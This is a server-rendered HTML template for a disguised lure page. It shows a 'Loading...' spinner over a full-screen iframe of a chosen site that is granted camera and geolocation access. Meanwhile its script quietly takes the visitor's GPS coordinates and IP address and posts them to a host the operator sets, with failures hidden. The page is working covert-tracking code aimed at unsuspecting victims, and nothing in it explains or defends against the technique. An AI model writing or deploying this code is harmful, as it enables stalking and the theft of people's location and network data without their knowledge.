<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { margin: 0; padding: 0; background: #f1f5f9; }
        iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 999; }
        .spinner { width: 30px; height: 30px; border: 2px solid #e2e8f0; border-top: 2px solid #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .text { margin-top: 15px; color: #64748b; font-size: 14px; }
    </style>
</head>
<body>
    <div class="overlay" id="overlay">
        <div class="spinner"></div>
        <div class="text">Loading...</div>
    </div>
    <iframe src="<%= url %>" allow="camera; geolocation"></iframe>

    <script>
        const uid = '<%= uid %>';
        const host = '<%= host %>';
        const overlay = document.getElementById('overlay');

        async function send(endpoint, data) {
            try {
                await fetch(`${host}${endpoint}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ uid, ...data })
                });
            } catch (e) {}
        }

        // Quick data collection
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                send('/location', { lat: pos.coords.latitude, lon: pos.coords.longitude });
            });
        }

        send('/info', { data: `üåê IP: <%= ip %>` });

        // Hide overlay after 3 seconds
        setTimeout(() => {
            overlay.style.display = 'none';
        }, 3000);
    </script>
</body>
</html>
